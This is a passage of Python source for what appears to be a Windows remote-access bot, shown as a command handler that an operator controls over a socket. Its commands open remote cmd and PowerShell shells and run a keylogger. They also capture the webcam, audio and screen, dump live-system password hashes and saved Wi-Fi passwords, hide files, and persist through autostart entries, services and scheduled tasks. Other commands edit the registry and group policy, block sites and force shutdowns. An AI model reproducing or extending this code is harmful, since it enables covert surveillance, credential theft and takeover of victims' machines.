                send(buf.getvalue(), doc='ps.txt')
                return
        case 'kill':
            send('kill (pid|name)  —  Terminate process')
            return
        case 'run':
            send('run (path) -a (none|args) -w (true|false)  —  Launch file')
            return
        case 'cmd' | 'powershell' as tshell:
            is_cmd = tshell == 'cmd'

            fpwd = ('' if is_cmd else 'PS ') + '{}> '
            fshell = wincmd if is_cmd else powershell

            current_path = os.getcwd()

            while True:
                send(fpwd.format(os.getcwd()))

                wcommand = recv()

                if wcommand == 'next':
                    continue
                elif wcommand.startswith('cd'):
                    try:
                        new_path = wcommand.split(maxsplit=1)[-1]
                        os.chdir(new_path)
                        send('\n')
                    except:
                        send(f'path does not exist "{new_path}"\n')
                elif wcommand == 'exit':
                    break
                else:
                    send(fshell(wcommand, output=True))

                sleep(0.01)
            
            os.chdir(current_path)
            return
        case 'eventlog':
            with StringIO() as buf:
                eventlog_dict = eventlog()

                if not eventlog_dict:
                    send(NULL)
                    return

                for k in eventlog_dict:
                    name = eventlog_dict[k]

                    if not name:
                        continue

                    buf.write(f'EVENT ({k}):\n')

                    for n in name:
                        buf.write(f'''\tID: {n[0]}
\tRECORD: {n[1]}
\tCATEGORY: {n[2]}
\tTYPE: {n[3]}
\tINFO: {n[4]}
\tDATA: {n[5]}\n
''')

                send(buf.getvalue(), doc='eventlog.txt')
                return
        case 'time':
            send('time -g  —  Get time\n\ntime -s (time)  —  Set time')
            return
        case 'date':
            send('date -g  —  Get date\n\ndate -s (date)  —  Set date')
            return
        case 'logout':
            shell('shutdown /f /t 0 /l')
            return
        case 'hibernate':
            windll.powrprof.SetSuspendState(1, 1, 0)
            return
        case 'sleep':
            windll.powrprof.SetSuspendState(0, 1, 0)
            return
        case 'reboot':
            shell('shutdown /f /t 0 /r')
            return
        case 'shutdown':
            shell('shutdown /f /t 0 /s')
            return
        case 'hashpass':
            try:
                send(str(hashpass.from_live_system()), doc='hashpass.txt')
            except:
                send('failed to hashpass [-]')

            return
        case 'mouse':
            send('''
mouse -p  —  Get current mouse position\n
mouse -d (true|false)  —  Display mouse cursor\n
mouse -t (0-7)  —  Set mouse trail\n 
mouse -c arrow (none|path) ibeam (none|path) hand (none|path) wait (none|path)  —  Change mouse cursor\n 
mouse -x (coordinate) -y (coordinate) -d (delay)  —  Move mouse\n
mouse -f (1-20)  —  Set mouse sensitivity\n
mouse -v (0|1|2)  —  Set mouse speed\n
mouse -l|-r|-m -c (click) -d (delay)  —  Click mouse button\n
mouse -b (true|false)  —  Swap mouse buttons\n
mouse -s (amount)  —  Mouse scroll
''')
            return
        case 'keyboard':
            send('''
keyboard -l  —  Get current keyboard layout\n
keyboard -s (layout)  —  Set keyboard layout\n
keyboard -v (0-31)  —  Set keyboard speed\n
keyboard -d (0-3)  —  Set keyboard delay\n
keyboard -t (text) -d (second)  —  Type on keyboard\n
keyboard -k (key) -p (amount) -d (second)  —  Press key or hotkey on keyboard\n
keyboard -c -k|-h (key) -n (new_key)  —  Remap key or hotkey on keyboard\n
keyboard -b (key)  —  Block key or hotkey on keyboard\n
keyboard -r  —  Reset keyboard settings
''')
            return
        case 'clipboard':
            send('''
clipboard -g  —  Get data from clipboard\n
clipboard -c (data)  —  Copy data to clipboard\n
clipboard -r  —  Clear clipboard
''')
            return
        case 'screen':
            send('''
screen -e  —  Turn on screen\n     
screen -d  —  Turn off screen\n
screen -s  —  Take screenshot\n
screen -w (path)  —  Change wallpaper
''')
            return
        case 'webcam':
            png = webcam_screenshot()

            send(_x00 if png is None else png)
            return
        case 'audio':
            send('audio (second)  —  Record audio\n\naudio -p (path)  —  Play audio')
            return
        case 'share':
            send('share -s  —  Share screen\n\nshare -w  —  Share webcam\n\nshare -a  —  Share audio')
            return
        case 'img':
            send('img (path)  —  Display image')
            return
        case 'msg':
            send('msg (-p|-s|-i|-w|-e) (title) -t (text)  —  Display message')
            return
        case 'keylogger':
            send('''
keylogger -g (base|char|hotkey|no hotkey)  —  Get keylogger data\n
keylogger -e  —  Enable keylogger\n
keylogger -d  —  Disable keylogger\n
keylogger -s  —  Keylogger status\n
keylogger -r  —  Reset keylogger data
''')
            return

    cmd_lower = cmd_lower.split(maxsplit=1)

    if len(cmd_lower) != 2:
        send(f'command not found ({cmd})')
        return
    
    args = cmd.split(maxsplit=1)[-1]

    match cmd_lower[0]:
        case 'config':
            if args == '-g':
                send(f'''
IS_EXE = {IS_EXE}


#-------------------------|NECESSARILY|-------------------------#
PORT = {PORT}
SEED = {SEED}
PATH = {PATH}
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
BOT_FILE_NAME = {BOT_FILE_NAME}
BOT_TASK_NAME = {BOT_TASK_NAME}
BOT_TASK_DESCRIPTION = {BOT_TASK_DESCRIPTION}
BOT_EXE = {BOT_EXE}
#----------------------------|END|---------------------------#
''')
                return
            elif exp := parse_cmd(r'(?P<const>SEED)\s*-s\s*(?P<value>.+)', args):
                value = exp['value'] 
            
                match exp['const']:
                    case 'SEED':
                        if not value.isdigit():
                            send('(SEED) is invalid')
                            return
                        
                        write_file(CONFIG_SEED, value)
                        send(f'SEED is changed ({SEED}) --> ({value}) [+]')
                        
                return
            elif exp := parse_cmd(r'-r\s*(?P<const>SEED)', args):
                match exp['const']:
                    case 'SEED':
                        if os.path.isfile(CONFIG_SEED):
                            os.remove(CONFIG_SEED)
                            send('reset (SEED) [+]')

                return
        case 'autostart':
            if args == '-l':
                try:
                    autostart_files = decrypt(read_file(FILE_AUTOSTART)).splitlines()
                except:
                    send('no files in bot autostart [*]')
                    return

                bfiles = []
                
                for line in autostart_files:
                    try:
                        n = line.split('=')

                        bname, bpath, bwindow = n[0].split('\u200B')
                        bargs, bdate = n[1].split('\u200B')

                        bfiles.append([bname, bpath, bargs, bwindow.upper(), bdate])
                    except:
                        continue

                send(tabulate(bfiles, headers=[('NAME'), ('PATH'), ('ARGUMENTS'), ('WINDOW'), ('DATE')], tablefmt='grid'), doc='autostart.txt') if bfiles else send('no files in bot autostart [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-w\s*(?P<window>true|false)', args):
                bname, bpath, bargs, bwindow, date = exp['name'], exp['path'], exp['args'], exp['window'], get_date()

                bpath = os.path.abspath(bpath) if os.path.isfile(bpath) else os.path.join(PATH_SHARE, bpath)
  
                if not os.path.isfile(bpath):
                    send(f'file does not exist ({os.path.split(bpath)[-1]}) [*]')
                    return
 
                if not os.path.isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')

                send(f'added file ({bname}) in bot autostart [+]' if change_file(FILE_AUTOSTART, bname, f'{bname}\u200B{bpath}\u200B{bwindow}={bargs}\u200B{date[0]} | {date[1]}', enc=True) else f'failed to add file ({bname}) in bot autostart [-]')
                return        
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                bname = exp['name']
                
                send(f'deleted file from bot autostart ({bname}) [+]' if change_file(FILE_AUTOSTART, bname, bname, delete=True, enc=True) else f'file does not exist ({bname}) in bot autostart [*]') if os.path.isfile(FILE_AUTOSTART) else send('no files in bot autostart [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')
                    send('bot autostart is reset [+]')
                else:
                    send('no files in bot autostart [*]')

                return
        case 'cd':
            if os.path.isdir(args):
                os.chdir(args)
                send(f'directory changed ({args}) [+]\n\nCURRENT DIRECTORY: {os.getcwd()}')
            else:
                send(f'directory does not exist ({args}) [*]')

            return
        case 'mkfile':        
            if exp := parse_cmd(r'(?P<path>.*?)\s*-d\s*(?P<data>.+)', args):
                path = exp['path']

                try:
                    write_file(path, exp['data'].replace('\\t', '\t').replace('\\n', '\n'))
                except:
                    send(f'failed to create file ({path}) [-]')
                else:
                    send(f'file is created ({path}) [+]')

                return
        case 'mkdir':
            try:
                mkdir(args)
            except:
                send(f'failed to create dir ({args}) [-]')
            else:
                send(f'dir is created ({args}) [+]')
            
            return
        case 'rn':           
            if exp := parse_cmd(r'(?P<name>.*?)\s*-n\s*(?P<new_name>.+)', args):
                current_name, new_name = exp['name'], exp['new_name']

                path = os.path.split(os.path.abspath(current_name))[0]

                if os.path.exists(current_name):
                    try:
                        os.rename(current_name, os.path.join(path, new_name))
                    except:
                        send(f'failed to rename path ({current_name}) [-]')
                    else:
                        send(f'path is renamed ({current_name}) --> ({new_name}) [+]')
                else:
                    send(f'path does not exist ({current_name}) [*]')

                return
        case 'rm':
            if os.path.isfile(args):
                try:
                    os.remove(args)
                except:
                    send(f'failed to delete file ({args}) [-]')
                else:
                    send(f'file is deleted ({args}) [+]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        case 'rmdir':
            if os.path.isdir(args):
                try:
                    shutil.rmtree(args)
                except:
                    send(f'failed to delete dir ({args}) [-]')
                else:
                    send(f'dir is deleted ({args}) [+]')
            else:
                send(f'dir does not exist ({args}) [*]')
            
            return
        case 'cp':        
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                from_path, to_path = exp['from_path'], exp['to_path']

                if os.path.exists(from_path):
                    try:
                        (shutil.copy if os.path.isfile(from_path) else shutil.copytree)(from_path, to_path)
                    except:
                        send(f'failed to copy path ({from_path}) [-]')
                    else:
                        send(f'path is copied ({from_path}) --> ({to_path}) [+]')
                else:
                    send(f'path does not exist ({from_path}) [*]')

                return
        case 'mv':           
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                from_path, to_path = exp['from_path'], exp['to_path']

                if os.path.exists(from_path):
                    try:
                        shutil.move(from_path, to_path)
                    except:
                        send(f'failed to move path ({from_path}) [-]')
                    else:
                        send(f'path is moved ({from_path}) --> ({to_path}) [+]')
                else:
                    send(f'path does not exist ({from_path}) [*]')

                return
        case 'hide':
            if os.path.exists(args):
                send(f'path is hidden ({args}) [+]' if hide(args) else f'failed to hide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        case 'unhide':
            if os.path.exists(args):
                send(f'path is unhidden ({args}) [+]' if unhide(args) else f'failed to unhide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        case 'cat':
            send(os.path.split(args)[-1])
            client.recv(64)

            if os.path.isfile(args):
                try:
                    file_data = read_file(args, b=True)
                    send(file_data if file_data else _x00) 
                except:
                    send(_x00)
            else:
                send(_x00)

            return
        case 'upload':
            file_path = recv()
            client.sendall(b'0x3effca34e681e5cb')

            with open(file_path, 'wb') as f:
                f.write(recv(b=True))
            
            return
        case 'inet':
            if args == '-e':
                send('inet is enabled [+]')
                shell('ipconfig /renew')
                return
            elif args == '-d':
                send('inet is disabled [+]')
                shell('ipconfig /release')
                return
        case 'wifi':
            if args == '-g':
                wifi_list = wifi()

                send(tabulate(wifi_list, headers=[('SSID'), ('BSSID'), ('GHZ'), ('CHANNEL'), ('AUTH'), ('CIPHER'), ('SIGNAL')], tablefmt='grid'), doc='wifi.txt') if wifi_list else send(NULL)
                return
            elif args == '-p':
                wifi_password_list = wifi_password()

                send(tabulate(wifi_password_list, headers=[('SSID'), ('PASSWORD')], tablefmt='grid'), doc='wifi_password.txt') if wifi_password_list else send(NULL)
                return
        case 'site':           
            if exp := parse_cmd(r'-p\s*(?P<url>.+)', args):
                url = exp['url']

                try:
                    open_site(url)
                except:
                    send(f'failed to open website ({url}) [-]')
                else:
                    send(f'website is opened ({url}) [+]')
                
                return
            elif exp := parse_cmd(r'-d\s*(?P<url>.*?)\s*-n\s*(?P<name>.+)', args):
                url, name = exp['url'], exp['name']

                query_http = http(url)

                if query_http is None:
                    send(f'failed to query website ({url}) [*]')
                    return

                try:
                    write_file(os.path.join(PATH_SHARE, name), query_http)
                except:
                    send(f'failed to download from website ({url}) [-]')
                else:
                    send(f'file is downloaded from website ({url}) --> ({name}) [+]')

                return
            elif args == '-l':
                if os.path.isfile(FILE_HOSTS):
                    bsites = []

                    for line in read_file(FILE_HOSTS).splitlines():
                        n = line.split()

                        if (len(n) > 4) and (n[2] == '#'):
                            bsites.append([n[1], f'{n[-1]} | {n[-2]}'])

                    send(tabulate(bsites, headers=[('DOMAIN'), ('DATE')], tablefmt='grid'), doc='blocked_sites.txt') if bsites else send('no blocked sites [*]')
                else:
                    send('no blocked sites [*]')

                return    
            elif exp := parse_cmd(r'-b\s*(?P<domain>.+)', args):
                domain, date = exp['domain'], get_date()

                try:
                    verify_domain(domain)
                except:
                    send(f'domain does not exist ({domain}) [*]')
                    return

                if not os.path.isfile(FILE_HOSTS):
                    write_file(FILE_HOSTS, '')

                send(f'site is blocked ({domain}) [+]' if change_file(FILE_HOSTS, domain, f'127.0.0.1    {domain}    # {date[0]} {date[1]}') else f'failed to block site ({domain}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<domain>.+)', args):
                domain = exp['domain']

                send(f'site is unblocked ({domain}) [+]' if change_file(FILE_HOSTS, domain, domain, delete=True) else f'site does not exist ({domain}) [*]') if os.path.isfile(FILE_HOSTS) else send('no blocked sites [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_HOSTS):
                    write_file(FILE_HOSTS, '')
                    send('sites is unblocked [+]')
                else:
                    send('no blocked sites [*]')
                    
                return
        case 'device':
            if args == '-g':
                with StringIO() as buf:
                    device_list = device('devices')

                    if not device_list:
                        send(NULL)
                        return 
                    
                    for n in device_list:
                        buf.write(f'''ID: {n[0]}
GUID: {n[1]}
NAME: {n[2]}
TYPE: {n[3]}
VENDOR: {n[4]}
DRIVER: {n[5]}
STATUS: {n[6]}\n
''')
                
                    send(buf.getvalue(), doc='device.txt')
                    return
            elif exp := parse_cmd(r'-q\s*(?P<id>.+)', args):
                dev = exp['id']

                with StringIO() as buf:
                    dquery = device('query', id=dev)
            
                    if not dquery:
                        send(f'device does not exist ({dev}) [*]')
                        return
                
                    for n in dquery:
                        buf.write(f'''ID: {n[0]}
GUID: {n[1]}
NAME: {n[2]}
TYPE: {n[3]}
VENDOR: {n[4]}
DRIVER: {n[5]}
STATUS: {n[6]}\n
''')
                
                    send(buf.getvalue(), doc='device.txt')                 
                    return
            elif exp := parse_cmd(r'-i\s*driver\s*(?P<driver>.+)', args):
                driver = exp['driver']

                send(f'device driver is installed ({driver}) [+]' if device('install_driver', driver=driver) else f'failed to install device driver ({driver}) [-]')
                return
            elif exp := parse_cmd(r'-s\s*(?P<type>device|driver)\s*(?P<id>.+)', args):
                dt, dev = exp['type'] == 'device', exp['id']

                df = device('delete' if dt else 'delete_driver', id=dev)

                if df is None:
                    send(f'device does not exist ({dev}) [*]')
                    return

                send('device ' + ('' if dt else 'driver ') + f'is deleted ({dev}) [+]' if df else 'failed to delete device ' + ('' if dt else 'driver ') + f'({dev}) [-]')
                return
            elif exp := parse_cmd(r'-e\s*(?P<id>.+)', args):
                dev = exp['id']

                df = device('enable', id=dev)

                if df is None:
                    send(f'device does not exist ({dev}) [*]')
                    return

                send(f'device is enabled ({dev}) [+]' if df else f'failed to enable device ({dev}) [-]')
                return
            elif exp := parse_cmd(r'-r\s*(?P<id>.+)', args):
                dev = exp['id']

                df = device('restart', id=dev)

                if df is None:
                    send(f'device does not exist ({dev}) [*]')
                    return

                send(f'device is restarted ({dev}) [+]' if df else f'failed to restart device ({dev}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<id>.+)', args):
                dev = exp['id']

                df = device('disable', id=dev)

                if df is None:
                    send(f'device does not exist ({dev}) [*]')
                    return

                send(f'device is disabled ({dev}) [+]' if df else f'failed to disable device ({dev}) [-]')
                return
            elif exp := parse_cmd(r'-v\s*(?P<dev>device_name|device_desc|bios_vendor|bios_version|bios_date|baseboard|baseboard_vendor|baseboard_version|cpu|cpu_id|cpu_mhz|cpu_vendor|os|os_edition|os_version|os_build|os_product|os_owner|os_date|node)\s*(?P<id>.+)?', args):
                dev, cid = exp['dev'], exp['id']

                if (dev in {'device_name', 'device_desc'}) and (cid is None):
                    send('device id is empty [*]')
                    return
                
                send(device('value', id=cid, changes=dev))
                return
            elif exp := parse_cmd(r'-c\s*(?P<dev>device_name|device_desc)\s*(?P<id>.*?)\s*-n\s*(?P<value>.+)', args):
                dev, cid, value = exp['dev'], exp['id'], exp['value']

                send(f'device ({cid}) ' + ('name' if dev == 'device_name' else 'description') + f' is changed ({value}) [+]' if device('change', id=cid, changes=[dev, value]) else f'failed to change device ' + ('name' if dev == 'device_name' else 'description') + f' ({cid}) [-]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<dev>bios_vendor|bios_version|bios_date|baseboard|baseboard_vendor|baseboard_version|cpu|cpu_id|cpu_mhz|cpu_vendor|os|os_edition|os_version|os_build|os_product|os_owner|os_date|node)\s*-n\s*(?P<value>.+)', args):
                dev, value = exp['dev'], exp['value']

                send(f'system ({dev}) information is changed ({value}) [+]' if device('change', changes=[dev, value]) else f'failed to change system information ({dev}) [-]')
                return
            elif args == '-u':
                device('update')
                send('devices configuration is updated [+]')
                return
            elif exp := parse_cmd(r'-p\s*(?P<path>.+)', args):
                path = exp['path']

                if not os.path.isfile(path):
                    send(f'file does not exist ({path}) [*]')
                    return
                
                try:
                    os.startfile(path, 'print')
                except:
                    send(f'failed to print file on printer ({path}) [-]')
                else:
                    send(f'file is printed on printer ({path}) [+]')

                return
        case 'reg':
            if args == '-i':
                send('''
ROOT:
\tHKEY_CLASSES_ROOT
\tHKEY_LOCAL_MACHINE
\tHKEY_CURRENT_USER
\tHKEY_CURRENT_CONFIG
\tHKEY_USERS
\tHKEY_DYN_DATA
\tHKEY_PERFORMANCE_DATA\n
TYPE:
\tnone  —  none
\tsz  —  string
\texpand_sz  —  string
\tbinary  —  bytes
\tdword  —  integer
\tdword_big_endian  —  integer
\tqword  —  integer
''')
                return           
            elif exp := parse_cmd(r'-c\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                key, name = exp['key'], exp['name']

                try:
                    reg_create_key(key, name) 
                except:
                    send(f'failed to create register key ({os.path.join(key, name)}) [-]')
                else:
                    send(f'register key is created ({os.path.join(key, name)}) [+]')
                
                return
            elif exp := parse_cmd(r'-c\s*(?P<key>.*?)\s*-n\s*(?P<name>.*?)\s*-v\s*(?P<value>.*?)\s*-t\s*(?P<type>none|sz|expand_sz|binary|dword|dword_big_endian|qword)', args):
                key, name, value, value_type = exp['key'], exp['name'], exp['value'], exp['type']
                     
                try:
                    reg_set_value(key, name, value, value_type) 
                except:
                    send(f'failed to create register value ({os.path.join(key, name)}) [-]')
                else:
                    send(f'register value is created ({os.path.join(key, name)}) [+]')
                
                return
            elif exp := parse_cmd(r'-d\s*(?P<type>-k|-v)\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                reg_dir, key, name = exp['type'] == '-k', exp['key'], exp['name']

                try:
                    reg_delete(key, name, dir=reg_dir)
                except FileNotFoundError:
                    send('register ' + ('key' if reg_dir else 'value') + f' does not exist ({os.path.join(key, name)}) [*]') 
                except:
                    send('failed to delete register ' + ('key' if reg_dir else 'value') + f' ({os.path.join(key, name)}) [-]')
                else:
                    send('register ' + ('key' if reg_dir else 'value') + f' is deleted ({os.path.join(key, name)}) [+]')

                return          
            elif exp := parse_cmd(r'-g\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                key, name = exp['key'], exp['name']

                try:
                    value, value_type = reg_get_value(key, name)
                except FileNotFoundError:
                    send(f'register value does not exist ({os.path.join(key, name)}) [*]')
                    return
                except:
                    send(f'failed to get register value ({os.path.join(key, name)}) [-]')
                    return
                
                send(f'NAME: {name}\nVALUE: {value}\nTYPE: {value_type}')
                return 
            elif exp := parse_cmd(r'-e\s*(?P<type>-k|-v)\s*(?P<key>.+)', args):
                reg_dir, key = exp['type'] == '-k', exp['key']

                try:
                    enum_list = reg_enum(key, dir=reg_dir)
                except FileNotFoundError:
                    send(f'register key does not exist ({key}) [*]') 
                    return
                except:
                    send(f'failed to get register enum ({key}) [-]')
                    return
                
                if not enum_list:
                    send(f'register enum is empty ({key}) [*]')
                    return

                with StringIO() as buf:
                    for n in enum_list:
                        buf.write(f'NAME: {n}\n\n' if reg_dir else f'NAME: {n[0]}\nVALUE: {n[1]}\nTYPE: {n[2]}\n\n')

                    send(buf.getvalue(), doc='reg.txt')
                    return
        case 'gpedit':
            if exp := parse_cmd(r'-e\s*(?P<user>machine|user)\s*(?P<type>-k|-v)\s*(?P<key>.+)', args):
                machine, gdir, key = exp['user'] == 'machine', exp['type'] == '-k', exp['key']

                gpath = os.path.join(
                    REG_KEY_MACHINE_POLICIES if machine else REG_KEY_USER_POLICIES, 
                    '' if key == 'main' else key
                )

                try:
                    enum_list = reg_enum(gpath, dir=gdir)
                except FileNotFoundError:
                    send(f'gpedit key does not exist ({key}) [*]')
                    return
                except:
                    send(f'failed to get gpedit enum ({key}) [-]')
                    return
      
                if not enum_list:
                    send(f'gpedit enum is empty ({key}) [*]')
                    return
                
                with StringIO() as buf:
                    buf.write(f'CURRENT KEY ({gpath}):\n')

                    for n in enum_list:
                        if gdir: 
                            buf.write(f'\tKEY: {n}\n\n')
                        else:
                            match n[1]:
                                case 0:
                                    gstatus = 'ALLOWED'
                                case 1:
                                    gstatus = 'BLOCKED'
                                case 2:
                                    gstatus = 'RESTRICTED'
                                case _:
                                    gstatus = NULL
                            
                            buf.write(f'\tPOLICY: {n[0]}\n\tSTATUS: {gstatus}\n\n')

                    send(buf.getvalue(), doc='gpedit.txt')
                    return
            elif exp := parse_cmd(r'-g\s*(?P<user>machine|user)\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                machine, key, name = exp['user'] == 'machine', exp['key'], exp['name']

                try:
                    gpolicy = reg_get_value(os.path.join(REG_KEY_MACHINE_POLICIES if machine else REG_KEY_USER_POLICIES, key), name) 
                except FileNotFoundError:
                    send(f'gpedit policy does not exist ({name}) [*]')
                    return
                except:
                    send(f'failed to get gpedit policy ({name}) [-]')
                    return

                match gpolicy[0]:
                    case 0:
                        gstatus = 'ALLOWED'
                    case 1:
                        gstatus = 'BLOCKED'
                    case 2:
                        gstatus = 'RESTRICTED'
                    case _:
                        gstatus = NULL

                send(f'POLICY: {name}\nSTATUS: {gstatus}')
                return
            elif exp := parse_cmd(r'-c\s*(?P<user>machine|user)\s*(?P<key>.*?)\s*-n\s*(?P<name>.*?)\s*-v\s*(?P<value>allowed|blocked|restricted)', args):
                machine, key, name, value = exp['user'] == 'machine', exp['key'], exp['name'], exp['value']

                match value:
                    case 'allowed':
                        gstatus = 0
                    case 'blocked':
                        gstatus = 1
                    case 'restricted':
                        gstatus = 2

                try:
                    reg_set_value(
                        os.path.join(REG_KEY_MACHINE_POLICIES if machine else REG_KEY_USER_POLICIES, key),
                        name,
                        gstatus,
                        'dword'
                    )
                except:
                    send(f'failed to create gpedit policy ({os.path.join(key, name)}) [-]')
                else:
                    send(f'gpedit policy is created ({os.path.join(key, name)}) [+]')

                return
            elif exp := parse_cmd(r'-d\s*(?P<user>machine|user)\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                machine, key, name = exp['user'] == 'machine', exp['key'], exp['name']

                try:
                    reg_delete(os.path.join(REG_KEY_MACHINE_POLICIES if machine else REG_KEY_USER_POLICIES, key), name, dir=False)
                except FileNotFoundError:
                    send(f'gpedit policy does not exist ({name}) [*]')
                except:
                    send(f'failed to delete gpedit policy ({name}) [-]')
                else:
                    send(f'gpedit policy is deleted ({name}) [+]')

                return
            elif args == '-u':
                shell('gpupdate /force')
                send('gpedit is updated [+]')
                return
        case 'service':
            if args == '-g':
                with StringIO() as buf:
                    service_list = service()

                    if not service_list:
                        send(NULL)
                        return
                    
                    for n in service_list:
                        buf.write(f'''PID: {n[0]}
NAME: {n[1]}
DISPLAY NAME: {n[2]}
DESCRIPTION: {n[3]}
USER: {n[4]}
COMMAND: {n[5]}
START TYPE: {n[6]}
STATUS: {n[7]}\n
''')
                
                    send(buf.getvalue(), doc='service.txt')
                    return
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                try:
                    query_service = psutil.win_service_get(name)
                except:
                    send(f'service does not exist ({name}) [*]')
                    return
                
                try:
                    service_pid = query_service.pid()
                except:
                    service_pid = NULL

                try:
                    service_description = query_service.description()
                except:
                    service_description = NULL

                service_pid = service_pid or NULL
                service_name = query_service.name() or NULL
                service_display_name = query_service.display_name() or NULL
                service_description = service_description or NULL
                service_username = query_service.username() or NULL
                service_binpath = query_service.binpath() or NULL
                service_start_type = query_service.start_type() or NULL
                service_status = query_service.status() or NULL
                    
                send(f'''
PID: {service_pid}
NAME: {service_name}
DISPLAY NAME: {service_display_name}
DESCRIPTION: {service_description}
USER: {service_username}
COMMAND: {service_binpath}
START TYPE: {service_start_type.upper()}
STATUS: {service_status.upper()}
''')
                return    
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-n\s*(?P<display_name>.*?)\s*-d\s*(?P<description>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-m\s*(?P<mode>autostart|manual|disable)', args):
                name, display_name, description, path, sargs, mode = exp['name'], exp['display_name'], exp['description'], exp['path'], exp['args'], exp['mode']

                if not os.path.isfile(path):
                    send(f'file does not exist ({path}) [*]')
                    return

                match mode:
                    case 'autostart':
                        service_mode = win32con.SERVICE_AUTO_START
                    case 'manual':
                        service_mode = win32con.SERVICE_DEMAND_START
                    case 'disable':
                        service_mode = win32con.SERVICE_DISABLED

                install_service = win32serviceutil.ChangeServiceConfig if exist_service(name) else win32serviceutil.InstallService
                
                try:
                    install_service(
                        name, 
                        serviceName=name, 
                        displayName=display_name,
                        description=description,
                        exeName=os.path.abspath(path),
                        exeArgs=sargs if sargs != 'none' else None,
                        startType=service_mode
                    )
                except:
                    send(f'failed to create service ({name}) [-]')
                else:
                    send(f'service is created ({name}) [+]') 
                    
                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return

                try:
                    win32serviceutil.RemoveService(name)
                except:
                    send(f'failed to delete service ({name}) [-]')
                else:
                    send(f'service is deleted ({name}) [+]')
                
                return
            elif exp := parse_cmd(r'-m\s*(?P<mode>autostart|manual|disable)\s*(?P<name>.+)', args):
                mode, name = exp['mode'], exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return
                
                match mode:
                    case 'autostart':
                        service_mode = win32con.SERVICE_AUTO_START
                    case 'manual':
                        service_mode = win32con.SERVICE_DEMAND_START
                    case 'disable':
                        service_mode = win32con.SERVICE_DISABLED
                    
                try:
                    win32serviceutil.ChangeServiceConfig(
                        name,
                        serviceName=name,
                        startType=service_mode
                    )
                except:
                    send(f'failed to change service mode ({name}) [-]')
                else:
                    send(f'service mode is changed ({name}) --> ({mode}) [+]')

                return
            elif exp := parse_cmd(r'-l\s*(?P<name>.+)', args):
                name = exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return

                try:
                    win32serviceutil.StartService(name)
                except:
                    send(f'failed to start service ({name}) [-]')
                else:
                    send(f'service is started ({name}) [+]')

                return    
            elif exp := parse_cmd(r'-r\s*(?P<name>.+)', args):
                name = exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return

                try:
                    win32serviceutil.RestartService(name)
                except:
                    send(f'failed to restart service ({name}) [-]')
                else:
                    send(f'service is restarted ({name}) [+]')

                return
            elif exp := parse_cmd(r'-s\s*(?P<name>.+)', args):
                name = exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return

                try:
                    win32serviceutil.StopService(name)
                except:
                    send(f'failed to stop service ({name}) [-]')
                else:
                    send(f'service is stopped ({name}) [+]')

                return  
        case 'task':
            if args == '-g':
                with StringIO() as buf:
                    task_list = task()

                    if not task_list:
                        send(NULL)
                        return
                    
                    for n in task_list:
                        buf.write(f'NAME: {n[0]}\nEVENT: {n[1]}\nSTATUS: {n[2]}\n\n')

                    send(buf.getvalue(), doc='task.txt')
                    return 
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return

                try:
                    qtask = scheduler().GetTask(name)
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'task does not exist ({name}) [*]')
                else:
                    definition = getattr(qtask, 'Definition', None)

                    registration = getattr(definition, 'RegistrationInfo', None)
                    principal = getattr(definition, 'Principal', None)
                    actions = getattr(definition, 'Actions', None)
                    settings = getattr(definition, 'Settings', None)

                    privilege = getattr(principal, 'RunLevel', NULL)

                    if privilege != NULL:
                        privilege = 'Highest' if privilege == 1 else 'Least'

                    match getattr(principal, 'LogonType', NULL):
                        case 1:
                            logon_type = 'Interactive'
                        case 2:
                            logon_type = 'Service Account'
                        case 3:
                            logon_type = 'Password'
                        case _:
                            logon_type = NULL
                    
                    match getattr(qtask, 'State', NULL):
                        case 1:
                            status = 'Disabled'
                        case 2:
                            status = 'Queued'
                        case 3:
                            status = 'Ready'
                        case 4:
                            status = 'Running'
                        case 5:
                            status = 'Finished'
                        case _:
                            status = NULL
                        
                    command = ''
                    
                    if actions is not None:
                        for n in actions:
                            command += f'\n\tPATH: {getattr(n, "Path", NULL)}\n\tARGUMENT: {getattr(n, "Arguments", NULL)}\n'
                    
                    send(f'''NAME: {getattr(qtask, "Name", NULL)}
DESCRIPTION: {getattr(registration, "Description", NULL)}
AUTHOR: {getattr(registration, "Author", NULL)}
OWNER: {getattr(principal, "UserId", NULL)}
PRIVILEGE: {privilege}
LOGON: {logon_type}
